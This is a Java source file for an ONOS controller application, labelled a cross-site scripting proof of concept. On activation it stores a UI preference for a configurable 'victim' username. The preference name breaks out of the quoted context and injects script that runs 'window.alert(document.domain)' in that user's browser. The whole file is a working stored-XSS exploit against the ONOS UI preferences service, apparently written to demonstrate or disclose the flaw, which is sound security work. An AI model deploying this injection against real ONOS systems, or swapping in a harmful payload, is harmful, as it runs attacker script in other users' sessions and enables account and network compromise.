/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.onosproject.xsspreferences.app;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.onosproject.core.CoreService;
import org.onosproject.ui.UiPreferencesService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.util.Set;
import java.lang.System;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.databind.node.JsonNodeFactory;

/**
 * XSS preferences POC Application
 */
@Component(immediate = true)
public class XssPreferences {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected UiPreferencesService uiPreferencesService;

    // --------------------------------------------------------
    // CHANGE THIS PARAMETER TO CHANGE VICTIM.
    // --------------------------------------------------------
    private static final String USERNAME = "onos";

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.xsspreferences.app", () -> log.info("Periscope down."));
        injectXss();
        log.info("Started xsspreferences App!");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Stopped xsspreferences App!");
    }

    private void injectXss() {
        ObjectNode on = new ObjectNode(new JsonNodeFactory(true));
        uiPreferencesService.setPreference(USERNAME, "xss-poc" + "\"\"\"\"" + "}};window.alert(document.domain);//", on);
    }
}
